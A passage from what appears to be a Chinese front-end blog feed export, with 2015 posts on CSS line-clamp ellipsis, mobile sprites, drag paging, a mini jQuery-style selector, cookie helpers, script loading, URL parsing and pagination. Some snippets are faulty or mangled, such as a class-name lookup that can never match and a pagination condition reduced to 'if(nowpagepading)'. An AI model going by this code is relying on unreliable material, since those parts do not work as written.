    <content type="text"><![CDATA[&emsp;&emsp;相信大家也开始接触移动端的项目了，移动端兼容各种设备想必让你也头疼吧。不过移动端也有它好的一面，就是可以用比较新的css3属性了，从而在布局上面来说也是福音。下面就说的就是文字内容超出就用省略号代替的问题，相信大家在PC端都知道多换文字是无法实现内容超出就用省略号显示的，多半是用字符串截取的方式了。那移动端就可以结合css3来实现，下面的例子就是多行内容如果没有显示全就用省略号代替了。当内容如果2行内还未显示全就用省略号替代了。实现代码：123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;title&gt;指定内容超过多少行还未显示完就用省略号代替&lt;/title&gt;&lt;style type="text/css"&gt;.box&#123;padding-top: 2px;line-height: 21px;display: -webkit-box;-webkit-line-clamp: 6;/*指定内容6行显示不完就用省略号代替*/word-wrap: break-word;word-break: break-all;overflow: hidden;text-overflow: ellipsis;-webkit-box-orient: vertical;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div style="height:100px;"&gt;&lt;/div&gt;&lt;div class="box"&gt;现场照片显示，一名身着浅色上衣的男子倒在怀化市人民检察院检务接待中心楼下的血泊中，落地的位置紧挨检务接待中心大门，男子侧躺地上，现场留下一滩血迹。中新网5月14日电 针对台湾老牌歌手陈升有关反对服贸协议等相关言论，国台办发言人马晓光在今天的例行记者会上指出，这种极端言论不能代表台湾大多数民众的想法，也不会为大多数大陆民众所接受。有记者问发言人：之前有媒体报道说，台湾老牌歌手陈升日前声称反对服贸协议，并说他“已经把大陆市场封杀”，还认为陆客不需要再去台湾，请问发言人对此有何看法？马晓光指出，我们注意到，我想，这种极端的言论不能代表台湾大多数民众的想法，也不会为大多数大陆民众所接受。任何人都不能剥夺两岸同胞相互往来和交流的权利。&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>多行省略号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于手机端CSS Sprite图标定位的一些领悟]]></title>
    <url>%2F2015%2F08%2F26%2F%E5%85%B3%E4%BA%8E%E6%89%8B%E6%9C%BA%E7%AB%AFcss-sprite%E5%9B%BE%E6%A0%87%E5%AE%9A%E4%BD%8D%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%86%E6%82%9F%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;今天在某个群里面闲逛，看见一个童鞋分享了一个携程的移动端的页面。地址这里我也分享下吧：http://m.ctrip.com/html5/在手机端我都很少用雪碧图合并定位图标，用的比较多就是用字体图标来代替，有些图标不多的时候就自己单个的切出来控制了。&emsp;&emsp;看了下携程的手机端的网站这些图标是用了雪碧图来合并的，因为一直以来手机端的屏幕大小不一，所以通常都会把设计图等比例缩放的形式展现，百分比的方式来布局，达到自适应。下面我们就来说说这个携程手机端的案例吧：首先这个雪碧图的原理与PC端的是一样的，只不过手机端的要按比例缩放一下。首先是合并的雪碧图：大家发现没有，雪碧图的尺寸与原图刚好缩放了2倍。&emsp;&emsp;再个就是原始 宽度和高度，以及图标的坐标位置。很明显通常元素的宽度和高度也就是要显示的图标的宽度和高度，这里也要缩放2倍。下面的图就是其中某个显示图标元素，包括宽度、高度和左边值刚好都是缩放过2倍的，所以看到这里都明白了吧，手机端的雪碧图就是这么做的，也挺简单的吧，比PC端就是多了一步缩放的计算，哈哈。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>手机端 sprite</tag>
        <tag>移动端 sprite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript拖拽翻页(ThrowPage)]]></title>
    <url>%2F2015%2F08%2F26%2Fjavascript%E6%8B%96%E6%8B%BD%E7%BF%BB%E9%A1%B5throwpage%2F</url>
    <content type="text"><![CDATA[查看演示结构层要把一个目录的内容按页展开，该怎么写呢？也许是这样，至少我就是这么写的1234567891011121314151617181920&lt;div id=”menu”&gt;&lt;div class=”page”&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;恋曲1980&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;恋曲1990&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;恋曲2000&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;母亲&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;span class=”tip”&gt;1/2页 拖拽翻页&lt;/span&gt;&lt;/div&gt;&lt;div class=”page”&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;伴侣&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;思念&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;童年&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;牧童&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;span class=”tip”&gt;2/2页 拖拽翻页&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul&gt; 是每一页的列表，图中的浅灰色色部分&lt;li&gt; 是列表中的一条，图中的珊瑚色部分&lt;span class=”tip”&gt; 是不应该出现在xhtml 中的，应该由 js 添加，它是每一页下面的索引标识，图中的深灰色部分&lt;div class=”page”&gt; 是目录中的页，图中的白色部分&lt;div id=”menu”&gt;是包含了所有页的目录，图中的亮蓝色部分。当然，如果页面中除了这个效果外没有其他东西的话，这个标签也可以不写，那么所有 &lt;div class=”page”&gt; 的父标签就是 &lt;body&gt;或许你会说，目录也应该是&lt;ul&gt;，所以应该这么写1234567891011121314151617181920&lt;ul id=”menu”&gt;&lt;li class=”page”&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;恋曲1980&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;恋曲1990&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;恋曲2000&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;母亲&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;span class=”tip”&gt;1/2页 拖拽翻页&lt;/span&gt;&lt;/li&gt;&lt;ul class=”page”&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;伴侣&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;思念&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;童年&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;09-11-25&lt;/span&gt;&lt;a&gt;牧童&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;span class=”tip”&gt;2/2页 拖拽翻页&lt;/span&gt;&lt;/li&gt;&lt;/li&gt;这样确实更符合语意，不过问题马上就来了表现层怎么给上面的嵌套列表定义 CSS 呢？如果万恶的 IE6 支持子对象选择符 “&gt;”，问题很简单。但为了兼容 IE6 和保证 xhtml 部分的简介，在后面另我抓狂的测试中，最终放弃了嵌套列表的方案（事实上，page 类都是由 js 动态设置的）。让 ThrowPage 应用到你的网页中，其实全靠为页面定义不同的 CSS 实现的，但有几点一定要注意。&lt;div id=”menu”&gt; 应该设置 (overflow:hidden)，否则动画过程中可能出现滚动条，影响效果;每个 &lt;div class=”page”&gt; 必须是绝对定位 (position:absolute;)如果希望出现 &lt;span class=”tip”&gt;，要为其预留空间，并且 &lt;ul&gt; 是应该有固定高度的不要用 IE6 的 AlphaImageLoader 滤镜为 &lt;div class=”tip”&gt; 添加 PNG 背景，那会让上面的链接在 IE6 中失效暂时就想到这么多，其实还有一些值得注意的，将在下一节作说明上面图中的 CSS 是这样定义的：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455html,body&#123;width:100%;height:100%;border:0px;margin:0px;overflow:hidden;&#125;#menu&#123;width:1000px;height:500px;overflow:hidden;background:lightblue;&#125;.page&#123;position:absolute;width:300px;height:400px;left:350px;top:50px;background:#FFF;border:1px solid #999;&#125;ul&#123;list-style:none;height:320px;margin:20px;padding:0px;background:#EEE;&#125;li&#123;font-size:12px;height:20px;line-height:20px;border-bottom:1px dashed #999;&#125;li span&#123;float:right;&#125;li a&#123;color:#000;text-decoration:none;&#125;li a:hover&#123;text-decoration:underline;&#125;.tip&#123;display:block;height:20px;margin:0px 20px;line-height:20px;text-align:center;font-size:12px;background:#999;&#125;行为层先简单说一下拖动是怎么实现的其中，A 是绝对定位的，并且有一个 left 值 a，当鼠标在上面按下（onmousedown）时，记录下 b 值，相减算出 c 值123456var c;*.onmousedown=function(e)&#123;if(!e)&#123;e=e||window.event;&#125;ex=e.pageX?e.pageX:e.x;c=ex-*.offsetLeft;&#125;鼠标按住并且移动时，A 应该随鼠标横向移动，不断产生 d 值，不断设定 A 的 left 值为 d-c，就实现了横向移动，纵向同理。12345*.onmousemove=function(e)&#123;if(!e)&#123;e=e||window.event;&#125;ex=e.pageX?e.pageX:e.x;*.style.left=ex-c;&#125;转到 ThrowPage，其实效果的前半段就是标准的横向拖动前面为 &lt;div class=”page”&gt; 定义了一个 left 值，如果想居中的话，这个值应为(&lt;div id=”menu”&gt;宽-&lt;div class=”page”&gt;宽)/2&nbsp;123456.page&#123;position:absolute;width:x px;left:50%;margin-left:-(x/2)px;&#125;实现居中的，涉及的 m-l 值请自行计算松开鼠标后，停止移动，开始动画，页面左边线（即图中 B，下简称“左边”）可能有以下几种情况：左边在 A 及 A 的左边——-页面跳到 AB 位置左边在 AB 中间——-页面移动到 AB 位置左边在 B——-不进行动画（变态，拽了半天又放回去）左边在 BD 中间——-页面移动到 DE 位置左边在 D 及 D 的右边——-页面跳到 DE 位置题外话：由此可见，移动的距离并不确定，用 JQ 的 animate 的话，时间一定，速度就不一样了，很挠墙。所以我的方法是：向目标位置移动 10 像素（几像素都可以，自己定，其实这就是移动速度），如果没有到目标位置，再移动 10 像素，可以到或者超过的话，直接跳到目标位置（很像递归，但确切的说不是）向中间回移也是同样道理，故略z-index 层叠顺序问题：当最上面的层被拖拽的时候，他下面的一层会被显示，正如上图所示，被拖拽的层 z-index 值为 2，下面显示的一层 z-index 值为 1，再下面的被覆盖的层 z-index 值统统为 0被拖拽层移动到坐标中 AB 或 DE 后，降一下 z-index 值，飞回的时候就跑到后面去了，同理，“左拖前翻，右拖后翻”的实现关键，是计算好哪一层的 z-index 值应该是 1]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js拖拽页</tag>
        <tag>ThrowPage</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jq 地址栏链接与a标签链接匹配]]></title>
    <url>%2F2015%2F08%2F26%2Fjq%E5%9C%B0%E5%9D%80%E6%A0%8F%E9%93%BE%E6%8E%A5%E4%B8%8Ea%E6%A0%87%E7%AD%BE%E9%93%BE%E6%8E%A5%E5%8C%B9%E9%85%8D%2F</url>
    <content type="text"><![CDATA[如题所述，当出现这样的功能，点击某个链接后，给跳转后的该链接地址添加样式，通过添加class为current来增加特殊样式。如图所示：点击HTML+css3跳转后，给其添加如图样式：js代码如下：1234567891011121314151617var currUrl = window.location.href; var currStyle = function (links)&#123; links.each(function()&#123; var url = $(this).attr('href'); if (currUrl.indexOf(url) != -1)&#123; $(this).addClass("current"); return false; &#125; &#125;);&#125;怎样调用呢？如下jquery调用代码：12345$(function()&#123; currStyle($("#sidebar .list a"));&#125;)&nbsp;这样就实现了如图所示的功能。&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>链接添加样式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用原生态的JS实现类似JQuery的$(]]></title>
    <url>%2F2015%2F08%2F26%2F%E5%A6%82%E4%BD%95%E7%94%A8%E5%8E%9F%E7%94%9F%E6%80%81%E7%9A%84js%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCjquery%E7%9A%84id%EF%BC%8C-selector%E7%AD%89%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;之前有个一直做前端开发的朋友，问我一个问题，说去面试一家NB的公司，问一个看似很简单的问，一时却不知道如何实现，虽然对jquery使用的很多，其实如果没看过jQuery的源码，相信一时很多人都会尴尬，这里我简单的做个案例，便于大家参考，当然jQuery会写的比这个复杂很多，判断部分有很多内容，这里我只是把他简单化了，提供给不会的朋友参考思路。首先一个页面上有这些元素12&lt;div id="iddv" class="myclass"&gt; my name is allen zhang&lt;/div&gt;&lt;div id="dv" class="dvcs"&gt;i was from guizhou province&lt;/div&gt;我们的目的是用原生态的JS实现类似于JQuery 的$(“#id”)、$(“#id”).size()功能1. 实现 $(“#id”) / $(“#class”) / $(“div”)12345678910111213141516171819202122232425262728293031$ = function (str) &#123;return new JQuery(str);&#125;JQuery = function (str) &#123;if (str.indexOf("#") == 0)this.dom = document.getElementById(str.substring(1));else if (str.indexOf(".") == 0)this.dom = getElementsByClassName(str);elsethis.dom = document.getElementsByTagName(str);return this.dom;&#125;function getElementsByClassName(str) &#123;var elements = document.getElementsByTagName('*');if (!elements) &#123;for (var i = 0; i &lt;= elements.length; i++) &#123;if (elements[i].className == str.substring(1)) &#123;return elements[i];&#125;&#125;&#125;return "undefined";&#125;$("#iddv"); //output: &lt;div id="iddv" class="myclass"&gt;$(".myclass"); //output: &lt;div id="iddv" class="myclass"&gt;$("div"); //[div#iddv.myclass, div#dv.dvcs]2. 为了实现 $(“#id”).size()，在上面的基础上改了一下，同过继承的方式来实现的，如果你对js的继承方式不大了解，可以在网上搜一下，并于更好的理解以下方式。123456789101112131415161718192021222324252627282930313233343536373839404142434445$ = window.JQuery = function (str) &#123;return new JQuery.prototype.init(str);&#125;JQuery.prototype = &#123;name: "JQuery",version: "1.71",init: function (str) &#123;if (str.indexOf("#") == 0) &#123;this.dom = document.getElementById(str.substring(1));this.length = 1;&#125;else if (str.indexOf(".") == 0) &#123;this.dom = getElementsByClassName(str.substring(1));this.length = this.dom.length;&#125;else &#123;this.dom = document.getElementsByTagName(str);this.length = this.dom.length;&#125;&#125;,size: function () &#123;if (this.dom)return this.length;&#125;&#125;function getElementsByClassName(str) &#123;var elements = document.getElementsByTagName('*');if (!elements) &#123;for (var i = 0; i &lt;= elements.length; i++) &#123;if (elements[i].className == str.substring(1)) &#123;return elements[i];&#125;&#125;&#125;return "undefined";&#125;JQuery.prototype.init.prototype = JQuery.prototype; // 这个地方很重要，通过原型链的方式，让$拥有size的方法，否则访问不到这个函数。$("#iddv").size(); //output: 1$(".myclass").size(); // output: 1$("div").size(); // output:2&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JS 实现jq选择器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS cookie 读写操作]]></title>
    <url>%2F2015%2F08%2F26%2Fjs-cookie-%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/***** 功能： cookie操作对象***/var cookies = &#123; /*** ** 功能： 写入cookie操作 ** 参数： name cookie名称 ** value cookie值 ** expires 过期时间 ** path 路径 ** domain 域 ***/ set: function (name, value, expires, path, domain) &#123; expires = new Date(new Date().getTime() + (((typeof expires == "undefined") ? 12 * 7200 : expires)) * 1000); var tempcookie = name + "=" + escape(value) + ((expires) ? "; expires=" + expires.toGMTString() : "") + ((path) ? "; path=" + path : "; path=/") + ((domain) ? "; domain=" + domain : ""); (tempcookie.length &lt; 4096) ? document.cookie = tempcookie : alert("The cookie is bigger than cookie lagrest"); &#125;, /*** ** 功能： 获取cookie操作 ** 参数： name cookie名称 ***/ get: function (name) &#123; var xarr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)")); if (xarr != null) return unescape(xarr[2]); return null; &#125;, /*** ** 功能： 删除cookie操作 ** 参数： name cookie名称 ** path 路径 ** domain 域 ***/ del: function (name, path, domain) &#123; if (this.get(name)) document.cookie = name + "=" + ((path) ? "; path=" + path : "; path=/") + ((domain) ? "; domain=" + domain : "") + ";expires=Thu, 01-Jan-1970 00:00:01 GMT"; &#125;, day: function (xd) &#123; return xd * 24 * 3600; &#125;, hour: function (xh) &#123; return xh * 3600; &#125;&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>cookie 读写</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态添加JS文件到页面中]]></title>
    <url>%2F2015%2F08%2F26%2F%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0js%E6%96%87%E4%BB%B6%E5%88%B0%E9%A1%B5%E9%9D%A2%E4%B8%AD%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637/***** 功能： 加载外部JS文件，加载完成后执行回调函数callback***/var utools = &#123; config: &#123; id: "", url: "", charset: "gb2312", callback: function () &#123; &#125; &#125;, merge: function (a, c) &#123; for (var b in c) a[b] = c[b]; return a &#125;, getScript: function (a) &#123; var r = Math.floor(Math.random() * 10000); this.config = this.merge(this.config, a); var callback = this.config.callback; var scriptNode = document.createElement("script"); scriptNode.setAttribute("id", this.config.id); scriptNode.setAttribute('charset', this.config.charset); scriptNode.setAttribute('type', 'text/javascript'); scriptNode.setAttribute('src', this.config.url + "?r=" + r); var head = document.getElementsByTagName("head")[0]; head.appendChild(scriptNode); scriptNode[document.all ? "onreadystatechange" : "onload"] = function () &#123; if (!this.readyState || this.readyState == "loaded" || this.readyState == "complete") &#123; if (callback) callback(); scriptNode.onreadystatechange = scriptNode.onload = null; scriptNode.parentNode.removeChild(scriptNode) &#125; &#125;; &#125;&#125;//调用方式utools.getScript(&#123;url:"js文件路径"&#125;);]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>动态添加JS文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS根据key值获取URL中的参数值，以及把URL的参数转换成json对象]]></title>
    <url>%2F2015%2F08%2F26%2Fjs%E6%A0%B9%E6%8D%AEkey%E5%80%BC%E8%8E%B7%E5%8F%96url%E4%B8%AD%E7%9A%84%E5%8F%82%E6%95%B0%E5%80%BC%EF%BC%8C%E4%BB%A5%E5%8F%8A%E6%8A%8Aurl%E7%9A%84%E5%8F%82%E6%95%B0%E8%BD%AC%E6%8D%A2%E6%88%90json%2F</url>
    <content type="text"><![CDATA[//把url的参数部分转化成json对象12345678910111213parseQueryString: function (url) &#123; var reg_url = /^[^\?]+\?([\w\W]+)$/, reg_para = /([^&amp;amp;=]+)=([\w\W]*?)(&amp;amp;|$|#)/g, arr_url = reg_url.exec(url), ret = &#123;&#125;; if (arr_url &amp;amp;&amp;amp; arr_url[1]) &#123; var str_para = arr_url[1], result; while ((result = reg_para.exec(str_para)) != null) &#123; ret[result[1]] = result[2]; &#125; &#125; return ret; &#125;// 通过key获取url中的参数值123456getQueryString: function (name) &#123; var reg = new RegExp("(^|&amp;amp;)" + name + "=([^&amp;amp;]*)(&amp;amp;|$)", "i"); var r = window.location.search.substr(1).match(reg); if (r != null) return unescape(r[2]); return null;&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>URL的参数转换成json对象</tag>
        <tag>根据key值获取URL中的参数值</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[国内UED收录分享]]></title>
    <url>%2F2015%2F08%2F26%2F%E5%9B%BD%E5%86%85ued%E6%94%B6%E5%BD%95%E5%88%86%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[腾讯腾讯CDC http://cdc.tencent.com/ CDC(Customer Research &amp; User Experience Design Center)腾讯用户研究与体验设计中心腾讯ISD http://isd.tencent.com/腾讯UED http://ued.qq.com/腾讯WSD http://wsd.tencent.com/腾讯TGideas http://tgideas.qq.com/ 腾讯游戏的专业设计团队腾讯ISUX http://isux.tencent.com/ ISUX (Internet Service User Experience)腾讯互联网用户体验设计部腾讯GDC http://gdc.qq.com/ GDC（Game Design Center）QQ游戏设计中心腾讯ECD http://ecd.tencent.com/百度百度UEO http://www.baiduux.com/ UEO（User Experience Organization) 百度泛用户体验平台百度MUX http://mux.baidu.com/ MUX(Mobile User Experience) 百度无线用户体验部。百度UED http://ued.baidu.com/ 百度商业产品用户体验部百度XDC http://xdc.baidu.com/ 百度用户体验部阿里淘宝UED http://ued.taobao.com/阿里巴巴(中文站 )UEDhttp://www.aliued.cn/阿里巴巴(国际站)UED http://www.aliued.com/阿里妈妈UED http://ued.alimama.com/口碑网UED http://ued.koubei.com/支付宝UED http://ued.alipay.com/支付宝PED http://ped.alipay.com/PED(Product Experience Design)支付宝产品体验设计部天猫UED http://ued.tmall.com/天猫SED http://sed.tmall.com/一淘网UX http://ux.etao.com/新浪新浪UED http://ued.sina.com/微博UDC http://udc.weibo.com/新浪ChinaUED http://blog.sina.com.cn/chinaued新浪SNS梦之队 http://blog.sina.com.cn/cnsns新浪UED http://blog.sina.com.cn/uimedia新浪乐居UED http://ued.leju.com网易网易UEDC http://uedc.163.com/ UEDC（User Experience Design Center）网易用户体验设计中心网易GUX http://gux.163.com/ GUX（Game User eXperience）网易游戏用户体验中心网易杭州UED http://ucd.blog.163.com/搜狐搜狐UED http://ued.sohu.com/搜狗UED http://ued.sogou.com/搜狐焦点UED http://ued.focus.cn/搜狐MUED http://mued.sohu.com/ Mobile User Experience Design 搜狐移动门户中心 用户体验团队其他盛大UED http://www.sndaued.com/携程UED http://ued.ctrip.com/360奇舞团 http://www.75team.com/人人FED http://fed.renren.com/ FED（Front End Develop and Design）爱词霸UED http://ued.iciba.com/金蝶友商网UED http://www.kdued.com/5173UED http://ued.5173.com/19楼UED http://blog.19ued.com/财付通TID http://tid.tenpay.com/ TID（Tenpay Innovation Design）财付通设计中心。迅雷CUED http://cued.xunlei.com/ 迅雷用户体验设计中心驴妈妈UED http://ued.lvmama.com/3G门户UED http://ued.3g.cn/虎扑用户体验设计工厂 http://ued.hupu.com/第九城市UED http://www.the9ued.com/MyEChinese UED http://ued.myechinese.com/彩程UED http://blog.mycolorway.com/昆仑游戏UED http://www.gameued.com/搜道网UED http://d2.sodao.com/360UXC http://uxc.360.cn/]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>国内UED收录汇总</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用纯js写的一个分页]]></title>
    <url>%2F2015%2F08%2F26%2F%E4%BD%BF%E7%94%A8%E7%BA%AFjs%E5%86%99%E7%9A%84%E4%B8%80%E4%B8%AA%E5%88%86%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[上图晒效果：&emsp;&emsp;网上确实有很多分页的插件以及开源代码，单本是一个后台开发猿，前台css等样式还驾驭不住，所以就开始自己去写了。其实这个分页原理很简单，就是用ajax往后台传值(当前页码)，后台使用limit进行分页。&emsp;&emsp;因为时间紧张，写的应该也不是很完美，有些公共的没有抽取出来，但是用起来还是可以的，这块代码是可以把它当做公共的分页去处理的，我就是用这块代码写了两个稍微不同一些的分页！公共的代码抽取的也差不多，主要就是ajax后台以及返回的值不同而已，只要把总页码的值获取到，点击首页/下一页等传值正确的话，基本上分页是不会出什么问题的，废话不多说，直接上代码了！ 注：本项目是全程使用js来写的，前台的数据通过ajax进行获取，然后再进行拼装，动态加载到页面。1.先把上一页，下一页等的代码附上(里面的值都是伪值，下面会在js里进行重新赋值的！)1234567891011121314151617181920212223242526&lt;ul class="page" id="page"&gt;&lt;li id="shouye" class="p-prev disabled"&gt;&lt;a href='javascript:indexpage(1);'&gt;首 页&lt;/a&gt;&lt;/li&gt;&lt;li id="shangyiye" class="p-prev disabled" &gt;&lt;a href='javascript:indexpage(-1);'&gt;&lt;i&gt;&lt;/i&gt;上一页&lt;/a&gt;&lt;/li&gt;&lt;li &gt;&lt;a id="one" href="javascript:void(0);" &gt;1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a id="two" href="javascript:void(0);" &gt;2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a id="three" href="javascript:void(0);" &gt;3&lt;/a&gt;&lt;/li&gt;&lt;li class="more"&gt;&lt;a id="five" href="javascript:void(0);" &gt;...&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a id="fore" href="javascript:void(0);" &gt;13855&lt;/a&gt;&lt;/li&gt;&lt;li class='p-next'&gt;&lt;a href='javascript:indexpage(-3);' onclick="jumpToPage('2','/goods/ajaxqueryGoodsList.do.html','','goodsListContainer','13855', listPageCallback);"&gt;下一页&lt;i&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;&lt;li id="weiye" class='p-next'&gt;&lt;a href='javascript:void(0);' onclick="indexpage(0);"&gt;尾 页&lt;/a&gt;&lt;/li&gt;&lt;li class="total"&gt;&lt;span id="span_number"&gt;共13855页 到第&lt;input type="text" id="input_number" class="page-txtbox" /&gt;页&lt;input name="" value="确定" type="button" onclick="jumpToPage(jQuery('#input_number').val(),'/goods/ajaxqueryGoodsList.do.html','','goodsListContainer','13855', listPageCallback);" class="page-btn"/&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;2.首先在页面放两个隐藏域，一个是当前页码，一个是总页码，总页码是页面加载完，从后台查询出来后直接附上值的，当前页码是没操作一个，就要对当前页码赋值12&lt;input id="jiazai" type="hidden" &gt;&lt;!-- 当前页码 --&gt;&lt;input id="totalpage" type="hidden" &gt;&lt;!-- 总页码 --&gt;3.写一个页面加载完的function，给总页码和当前页码赋值12345$(function()&#123; $('#jiazai').val(1);//给当前页码进行赋值，默认为第一页 ajaxfunction(page,arg,chipssort,'');//这个方法是抽取的ajax后台访问的方法&#125;);4.抽取的ajax方法，此页面会用到好几次这个方法，所有把它收取了出来，因为页面的数据时通过ajax从后台获取到的，后台返回的是一个List集合12345678910111213141516171819//抽取ajax的方法function ajaxfunction(page,arg,chipssort,fontval)&#123; $.ajax(&#123; type:'POST', url:'/admin/receptionchips/showlist',//请求的url地址 data:&#123; page:page, sort:arg, chipssort:chipssort, fontval:fontval &#125;, dataType:'json', contentType:'application/x-www-form-urlencoded; charset=utf-8', success:function(data)&#123; //返回值在进行访问抽取的方法，从后台返回 commonfunction(data); &#125; &#125;);&#125;5.代码看到这也不是很多，最后一个了12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697//抽取拼串的方法function commonfunction(data)&#123; $('#projectlist').find("li").remove(); for (var i=0;i&lt;data.length;i++ ) &#123; /*****因为此页面是动态加载的，这里主要就是进行拼串，代码也不少，就不漏出来占空间了*****/ &#125; //开始是分页的核心了 if(data.length&gt;0)&#123; //设置页码 var pading = data[0].padingnum;//总页码 $('#totalpage').val(pading); var page = $('#jiazai').val();//当前页 $('#countpage').html("**"+page+"**/"+pading+""); $('#span_number').html("共"+pading+"页 到第&lt;input id="input_number" class="page-txtbox" type="text" /&gt;页&lt;input class="page-btn" name="" type="button" value="确定" /&gt;") &#125;else&#123; $('#countpage').html("**"+0+"**/"+0+""); &#125; //设置分页的底部 就是 首页 1 2 3 4 5 6 尾页 var pading = data[0].padingnum;//总页码href="javascript:void(0);" var nowpage = $('#jiazai').val();//当前页 //one two three five fore //下面代码看着是比较麻烦，但是也不难理解 全是一样的代码，只不过是加了些判断 if(nowpagepading)&#123; $('#five').parent().hide(); $('#fore').parent().hide(); &#125;else&#123; $('#five').parent().show(); $('#five').text(Number(nowpage)+1); $('#five').attr('href','javascript:indexpage("'+(Number(nowpage)+1)+'");'); &#125; //判断下一页的第二页是否超过了总页数 if(Number(nowpage)+2&gt;pading)&#123; $('#fore').parent().hide(); &#125;else&#123; $('#fore').parent().show(); $('#fore').text(Number(nowpage)+2); $('#fore').attr('href','javascript:indexpage("'+(Number(nowpage)+2)+'");'); &#125; &#125; //如果总页数小于5，这块代码主要就是设置 1 2 3 4 5 这些的显示和隐藏的 if(pading==0)&#123; $('#one').parent().hide(); $('#two').parent().hide(); $('#three').parent().hide(); $('#five').parent().hide(); $('#fore').parent().hide(); &#125;else if(pading==1)&#123; $('#shouye').hide(); $('#weiye').hide(); $('#one').parent().hide(); $('#two').parent().hide(); $('#three').parent().hide(); $('#five').parent().hide(); $('#fore').parent().hide(); &#125;else if(pading==2)&#123; $('#one').parent().show(); $('#two').parent().show(); $('#three').parent().hide(); $('#five').parent().hide(); $('#fore').parent().hide(); &#125;else if(pading==3)&#123; $('#one').parent().show(); $('#two').parent().show(); $('#three').parent().show(); $('#five').parent().hide(); $('#fore').parent().hide(); &#125;else if(pading==4)&#123; $('#one').parent().show(); $('#two').parent().show(); $('#three').parent().show(); $('#five').parent().show(); $('#fore').parent().hide(); &#125;else&#123; $('#one').parent().show(); $('#two').parent().show(); $('#three').parent().show(); $('#five').parent().show(); $('#fore').parent().show(); &#125; //设置高亮显示的，就是是第一页时，1亮，第二页时 2亮 $('#page a').each(function() &#123; $(this).parent().removeClass("current"); if($(this).text()==nowpage)&#123; $(this).parent().addClass("current"); &#125; &#125;); //分页完返回页面顶端 